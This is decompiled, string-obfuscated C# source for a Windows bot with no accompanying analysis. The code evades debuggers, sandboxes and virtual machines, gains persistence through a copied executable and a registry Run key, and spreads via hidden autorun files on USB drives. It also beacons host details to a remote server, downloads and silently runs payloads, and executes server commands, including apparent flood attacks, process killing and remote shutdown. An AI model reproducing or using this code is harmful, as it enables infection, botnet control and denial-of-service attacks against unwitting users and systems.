using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

internal sealed class Class0
{
	private static string string_0 = Class9.smethod_0(-51991661);

	private static string string_1 = Class9.smethod_0(-51991617);

	private static string string_2 = Class9.smethod_0(-51991639);

	private static bool bool_0 = true;

	private static bool bool_1 = true;

	private static bool bool_2 = true;

	private static bool bool_3 = true;

	private static bool bool_4 = true;

	private static bool bool_5 = false;

	private static bool bool_6 = true;

	private static bool bool_7 = true;

	private static string string_3 = Class9.smethod_0(-51991983);

	private static bool bool_8 = true;

	private static string string_4 = Class9.smethod_0(-51991617);

	private static string string_5 = Class9.smethod_0(-51991975);

	private static string string_6 = Environment.MachineName;

	private static string string_7 = smethod_8();

	private static string string_8 = CultureInfo.InstalledUICulture.EnglishName;

	private static string string_9 = smethod_7(smethod_3());

	public static bool smethod_0(string string_10)
	{
		return Process.GetProcessesByName(string_10).Length > 0;
	}

	public static string smethod_1()
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(Class9.smethod_0(-51991216), Class9.smethod_0(-51991231));
		string result = string.Empty;
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				result = Convert.ToString(((ManagementBaseObject)val2).get_Item(Class9.smethod_0(-51991189)));
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	private static string smethod_2(string string_10, string string_11)
	{
		ServicePointManager.Expect100Continue = false;
		WebRequest webRequest = WebRequest.Create(string_10);
		webRequest.ContentType = Class9.smethod_0(-51991291);
		webRequest.Method = Class9.smethod_0(-51991251);
		byte[] bytes = Encoding.ASCII.GetBytes(string_11);
		webRequest.ContentLength = bytes.Length;
		Stream requestStream = webRequest.GetRequestStream();
		requestStream.Write(bytes, 0, bytes.Length);
		requestStream.Close();
		WebResponse response = webRequest.GetResponse();
		if (response == null)
		{
			return null;
		}
		StreamReader streamReader = new StreamReader(response.GetResponseStream());
		return streamReader.ReadToEnd().Trim();
	}

	public static string smethod_3()
	{
		string text = smethod_4();
		string text2 = smethod_5();
		string text3 = smethod_6();
		return text + text2 + text3;
	}

	public static string smethod_4()
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(Class9.smethod_0(-51991216), Class9.smethod_0(-51991088));
		string result = string.Empty;
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				result = Convert.ToString(((ManagementBaseObject)val2).get_Item(Class9.smethod_0(-51991148)));
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string smethod_5()
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(Class9.smethod_0(-51991216), Class9.smethod_0(-51991231));
		string result = string.Empty;
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				result = Convert.ToString(((ManagementBaseObject)val2).get_Item(Class9.smethod_0(-51991189)));
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string smethod_6()
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(Class9.smethod_0(-51991216), Class9.smethod_0(-51991162));
		string result = string.Empty;
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				result = Convert.ToString(((ManagementBaseObject)val2).get_Item(Class9.smethod_0(-51991134)));
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string smethod_7(string string_10)
	{
		if (string_10 != null && string_10.Length != 0)
		{
			MD5 mD = new MD5CryptoServiceProvider();
			byte[] bytes = Encoding.Default.GetBytes(string_10);
			byte[] array = mD.ComputeHash(bytes);
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < array.Length; i++)
			{
				stringBuilder.Append(array[i].ToString(Class9.smethod_0(-51991459)));
			}
			return stringBuilder.ToString();
		}
		return string.Empty;
	}

	public static string smethod_8()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		string text = string.Empty;
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			if (oSVersion.Version.Minor == 10)
			{
				text = Class9.smethod_0(-51991482);
			}
			if (oSVersion.Version.Minor == 90)
			{
				text = Class9.smethod_0(-51991433);
			}
		}
		if (oSVersion.Platform == PlatformID.Win32NT)
		{
			if (oSVersion.Version.Major == 4)
			{
				text = Class9.smethod_0(-51991456);
			}
			if (oSVersion.Version.Major == 5)
			{
				switch (oSVersion.Version.Minor)
				{
				case 0:
					text = Class9.smethod_0(-51991523);
					break;
				case 1:
					text = Class9.smethod_0(-51991544);
					break;
				case 2:
					text = Class9.smethod_0(-51991495);
					break;
				}
			}
			if (oSVersion.Version.Major == 6)
			{
				switch (oSVersion.Version.Minor)
				{
				case 0:
					text = Class9.smethod_0(-51991341);
					break;
				case 1:
					text = Class9.smethod_0(-51991345);
					break;
				}
			}
		}
		if (text == string.Empty)
		{
			text = Class9.smethod_0(-51991297);
		}
		return text;
	}

	private static void Main(string[] args)
	{
		//IL_0078: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		if (bool_0)
		{
			try
			{
				if (Debugger.IsAttached)
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (bool_1)
		{
			try
			{
				long num = 0L;
				long num2 = 0L;
				num = DateTime.Now.Ticks;
				Thread.Sleep(10);
				num2 = DateTime.Now.Ticks;
				if (num2 - num < 10L)
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (bool_2)
		{
			try
			{
				Form val = new Form();
				((Control)val).set_Text(Class9.smethod_0(-51991400));
				val.set_Opacity(0.0);
				val.set_ShowInTaskbar(false);
				((Control)val).Show();
				if (((Control)val).get_Text() == Class9.smethod_0(-51991421))
				{
					return;
				}
				val.Close();
				string[] array = new string[12]
				{
					Class9.smethod_0(-51991362),
					Class9.smethod_0(-51991384),
					Class9.smethod_0(-51990694),
					Class9.smethod_0(-51990668),
					Class9.smethod_0(-51990661),
					Class9.smethod_0(-51990678),
					Class9.smethod_0(-51990759),
					Class9.smethod_0(-51990776),
					Class9.smethod_0(-51990721),
					Class9.smethod_0(-51990738),
					Class9.smethod_0(-51990575),
					Class9.smethod_0(-51990588)
				};
				for (int i = 0; i < array.Length; i++)
				{
					if (Environment.UserName == array[i])
					{
						return;
					}
				}
				string[] array2 = new string[7]
				{
					Class9.smethod_0(-51990577),
					Class9.smethod_0(-51990533),
					Class9.smethod_0(-51990634),
					Class9.smethod_0(-51990650),
					Class9.smethod_0(-51990608),
					Class9.smethod_0(-51990618),
					Class9.smethod_0(-51990613)
				};
				for (int j = 0; j < array2.Length; j++)
				{
					if (smethod_0(array2[j]))
					{
						return;
					}
				}
			}
			catch
			{
			}
		}
		if (bool_3)
		{
			try
			{
				Process[] processesByName = Process.GetProcessesByName(Class9.smethod_0(-51990951));
				Process[] array3 = processesByName;
				foreach (Process process in array3)
				{
					process.Kill();
				}
				string[] array4 = new string[13]
				{
					Class9.smethod_0(-51990961),
					Class9.smethod_0(-51990913),
					Class9.smethod_0(-51990931),
					Class9.smethod_0(-51991024),
					Class9.smethod_0(-51991034),
					Class9.smethod_0(-51991029),
					Class9.smethod_0(-51990983),
					Class9.smethod_0(-51990999),
					Class9.smethod_0(-51990820),
					Class9.smethod_0(-51990847),
					Class9.smethod_0(-51990795),
					Class9.smethod_0(-51990790),
					Class9.smethod_0(-51990804)
				};
				for (int l = 0; l < array4.Length; l++)
				{
					if (smethod_0(array4[l]))
					{
						return;
					}
				}
			}
			catch
			{
			}
		}
		if (bool_4)
		{
			try
			{
				string[] array5 = new string[4]
				{
					Class9.smethod_0(-51990894),
					Class9.smethod_0(-51990852),
					Class9.smethod_0(-51992228),
					Class9.smethod_0(-51992241)
				};
				for (int m = 0; m < array5.Length; m++)
				{
					string text = smethod_1();
					if (text == array5[m])
					{
						return;
					}
				}
			}
			catch
			{
			}
		}
		if (bool_7)
		{
			try
			{
				Thread.Sleep(Convert.ToInt32(string_3) * 1000);
			}
			catch
			{
			}
		}
		if (bool_8)
		{
			try
			{
				Process[] processesByName2 = Process.GetProcessesByName(string_4);
				processesByName2[0].Kill();
			}
			catch
			{
			}
		}
		try
		{
			string fileName = Process.GetCurrentProcess().MainModule!.FileName;
			FileStream fileStream = new FileStream(fileName, FileMode.Open, FileAccess.Read);
			byte[] array6 = new byte[fileStream.Length];
			fileStream.Read(array6, 0, array6.Length);
			fileStream.Close();
			FileStream fileStream2 = new FileStream(Environment.GetEnvironmentVariable(Class9.smethod_0(-51992220)) + Class9.smethod_0(-51992209) + string_1, FileMode.Create);
			fileStream2.Write(array6, 0, array6.Length);
			fileStream2.Close();
			fileStream2.Dispose();
		}
		catch
		{
		}
		try
		{
			string name = Class9.smethod_0(-51992297);
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
			registryKey.SetValue(Class9.smethod_0(-51992285), Environment.GetEnvironmentVariable(Class9.smethod_0(-51992220)) + Class9.smethod_0(-51992209) + string_1);
			registryKey.Close();
		}
		catch
		{
		}
		if (bool_6)
		{
			try
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				DriveInfo[] array7 = drives;
				foreach (DriveInfo driveInfo in array7)
				{
					if (driveInfo.DriveType == DriveType.Removable)
					{
						string fileName2 = Process.GetCurrentProcess().MainModule!.FileName;
						if (File.Exists(driveInfo.Name + Class9.smethod_0(-51992104)))
						{
							File.Delete(driveInfo.Name + Class9.smethod_0(-51992104));
						}
						FileStream fileStream3 = new FileStream(fileName2, FileMode.Open, FileAccess.Read);
						byte[] array8 = new byte[fileStream3.Length];
						fileStream3.Read(array8, 0, array8.Length);
						fileStream3.Close();
						FileStream fileStream4 = new FileStream(driveInfo.Name + Class9.smethod_0(-51992104), FileMode.Create);
						fileStream4.Write(array8, 0, array8.Length);
						fileStream4.Close();
						fileStream4.Dispose();
						File.SetAttributes(driveInfo.Name + Class9.smethod_0(-51992104), File.GetAttributes(driveInfo.Name + Class9.smethod_0(-51992104)) | FileAttributes.Hidden);
						if (File.Exists(driveInfo.Name + Class9.smethod_0(-51992118)))
						{
							File.Delete(driveInfo.Name + Class9.smethod_0(-51992118));
						}
						StreamWriter streamWriter = new StreamWriter(driveInfo.Name + Class9.smethod_0(-51992118));
						streamWriter.WriteLine(Class9.smethod_0(-51992092));
						streamWriter.WriteLine(Class9.smethod_0(-51992172));
						streamWriter.Close();
						File.SetAttributes(driveInfo.Name + Class9.smethod_0(-51992118), File.GetAttributes(driveInfo.Name + Class9.smethod_0(-51992118)) | FileAttributes.Hidden);
					}
				}
			}
			catch
			{
			}
		}
		if (bool_5 & !Path.GetFileName(Application.get_ExecutablePath())!.Equals(string_1))
		{
			try
			{
				string value = Class9.smethod_0(-51992189) + '"' + Environment.GetCommandLineArgs()[0] + '"' + Class9.smethod_0(-51992129) + '"' + Path.GetFileName(Application.get_ExecutablePath()) + '"' + Class9.smethod_0(-51992151) + Environment.SystemDirectory + '"' + Class9.smethod_0(-51992499);
				TextWriter textWriter = new StreamWriter(Environment.SystemDirectory + Class9.smethod_0(-51992453));
				textWriter.WriteLine(value);
				textWriter.Close();
				Process process2 = new Process();
				process2.StartInfo.FileName = Environment.SystemDirectory + Class9.smethod_0(-51992453);
				process2.StartInfo.UseShellExecute = false;
				process2.StartInfo.CreateNoWindow = true;
				process2.Start();
			}
			catch
			{
			}
			Environment.Exit(0);
		}
		try
		{
			string string_ = Class9.smethod_0(-51992555) + string_6 + Class9.smethod_0(-51992574) + string_5 + Class9.smethod_0(-51992527) + string_8 + Class9.smethod_0(-51992543) + string_7 + Class9.smethod_0(-51992368) + string_9;
			smethod_2(string_0, string_);
		}
		catch
		{
		}
		try
		{
			WebClient webClient = new WebClient();
			webClient.DownloadFile(Class9.smethod_0(-51992379), Environment.GetEnvironmentVariable(Class9.smethod_0(-51992220)) + Class9.smethod_0(-51992344));
			Process process3 = new Process();
			process3.StartInfo.FileName = Environment.GetEnvironmentVariable(Class9.smethod_0(-51992220)) + Class9.smethod_0(-51992344);
			process3.StartInfo.UseShellExecute = false;
			process3.StartInfo.CreateNoWindow = true;
			process3.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process3.Start();
		}
		catch
		{
		}
		while (true)
		{
			try
			{
				string string_2 = Class9.smethod_0(-51992442) + string_9;
				string text2 = smethod_2(string_0, string_2);
				if (text2.Length != 0)
				{
					smethod_9(text2);
				}
			}
			catch
			{
			}
			Thread.Sleep(Convert.ToInt32(Class0.string_2) * 60000);
		}
	}

	private static void smethod_9(string string_10)
	{
		//IL_0423: Unknown result type (might be due to invalid IL or missing references)
		//IL_042a: Expected O, but got Unknown
		//IL_0454: Unknown result type (might be due to invalid IL or missing references)
		//IL_045b: Expected O, but got Unknown
		try
		{
			string[] array = string_10.Split(new char[1] { '+' });
			if (string_10.StartsWith(Class9.smethod_0(-51992399)))
			{
				try
				{
					Class1.smethod_1();
				}
				catch
				{
				}
				try
				{
					Class1.string_0 = array[1];
					Class1.int_0 = Convert.ToInt32(array[2]);
					Class1.int_1 = Convert.ToInt32(array[3]);
					Class1.int_2 = Convert.ToInt32(array[4]);
					Class1.smethod_0();
				}
				catch
				{
				}
			}
			if (string_10.StartsWith(Class9.smethod_0(-51992412)))
			{
				try
				{
					Class3.smethod_1();
				}
				catch
				{
				}
				try
				{
					Class3.string_0 = array[1];
					Class3.int_0 = Convert.ToInt32(array[2]);
					Class3.smethod_0();
				}
				catch
				{
				}
			}
			if (string_10.StartsWith(Class9.smethod_0(-51992408)))
			{
				try
				{
					Class7.smethod_1();
				}
				catch
				{
				}
				try
				{
					Class7.string_0 = array[1];
					Class7.int_0 = Convert.ToInt32(array[2]);
					Class7.int_1 = Convert.ToInt32(array[3]);
					Class7.int_2 = Convert.ToInt32(array[4]);
					Class7.int_3 = Convert.ToInt32(array[5]);
					Class7.smethod_0();
				}
				catch
				{
				}
			}
			if (string_10.StartsWith(Class9.smethod_0(-51991725)))
			{
				try
				{
					Class5.smethod_1();
				}
				catch
				{
				}
				try
				{
					Class5.string_0 = array[1];
					Class5.int_0 = Convert.ToInt32(array[2]);
					Class5.int_1 = Convert.ToInt32(array[3]);
					Class5.int_2 = Convert.ToInt32(array[4]);
					Class5.int_3 = Convert.ToInt32(array[5]);
					Class5.smethod_0();
				}
				catch
				{
				}
			}
			if (string_10.StartsWith(Class9.smethod_0(-51991737)))
			{
				try
				{
					Class5.smethod_1();
				}
				catch
				{
				}
				try
				{
					Class3.smethod_1();
				}
				catch
				{
				}
				try
				{
					Class1.smethod_1();
				}
				catch
				{
				}
				try
				{
					Class7.smethod_1();
				}
				catch
				{
				}
			}
			if (string_10.StartsWith(Class9.smethod_0(-51991696)))
			{
				try
				{
					WebClient webClient = new WebClient();
					webClient.DownloadFile(array[1], Environment.GetEnvironmentVariable(Class9.smethod_0(-51992220)) + Class9.smethod_0(-51991708));
					Process process = new Process();
					process.StartInfo.FileName = Environment.GetEnvironmentVariable(Class9.smethod_0(-51992220)) + Class9.smethod_0(-51991708);
					process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process.Start();
				}
				catch
				{
				}
			}
			if (string_10.StartsWith(Class9.smethod_0(-51991791)))
			{
				try
				{
					Process[] processesByName = Process.GetProcessesByName(array[1]);
					processesByName[0].Kill();
				}
				catch
				{
				}
			}
			if (string_10.StartsWith(Class9.smethod_0(-51991803)))
			{
				try
				{
					string value = Class9.smethod_0(-51992189) + '"' + Environment.GetCommandLineArgs()[0] + '"' + Class9.smethod_0(-51992129) + '"' + Path.GetFileName(Application.get_ExecutablePath()) + '"' + Class9.smethod_0(-51992151) + Environment.SystemDirectory + '"' + Class9.smethod_0(-51992499);
					TextWriter textWriter = new StreamWriter(Environment.SystemDirectory + Class9.smethod_0(-51992453));
					textWriter.WriteLine(value);
					textWriter.Close();
					Process process2 = new Process();
					process2.StartInfo.FileName = Environment.SystemDirectory + Class9.smethod_0(-51992453);
					process2.StartInfo.UseShellExecute = false;
					process2.StartInfo.CreateNoWindow = true;
					process2.Start();
				}
				catch
				{
				}
				try
				{
					string name = Class9.smethod_0(-51992297);
					RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
					registryKey.DeleteValue(Class9.smethod_0(-51992285));
					registryKey.Close();
				}
				catch
				{
				}
				Environment.Exit(0);
			}
			if (string_10.StartsWith(Class9.smethod_0(-51991797)))
			{
				try
				{
					ManagementClass val = new ManagementClass(Class9.smethod_0(-51991749));
					((ManagementObject)val).get_Scope().get_Options().set_EnablePrivileges(true);
					ManagementObjectEnumerator enumerator = val.GetInstances().GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementObject val2 = (ManagementObject)enumerator.get_Current();
							ManagementBaseObject methodParameters = val2.GetMethodParameters(Class9.smethod_0(-51991585));
							methodParameters.set_Item(Class9.smethod_0(-51991605), (object)12);
							methodParameters.set_Item(Class9.smethod_0(-51991553), (object)0);
							val2.InvokeMethod(Class9.smethod_0(-51991585), methodParameters, (InvokeMethodOptions)null);
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				catch
				{
				}
			}
			if (string_10.StartsWith(Class9.smethod_0(-51991570)))
			{
				Environment.Exit(0);
			}
		}
		catch
		{
		}
	}
}
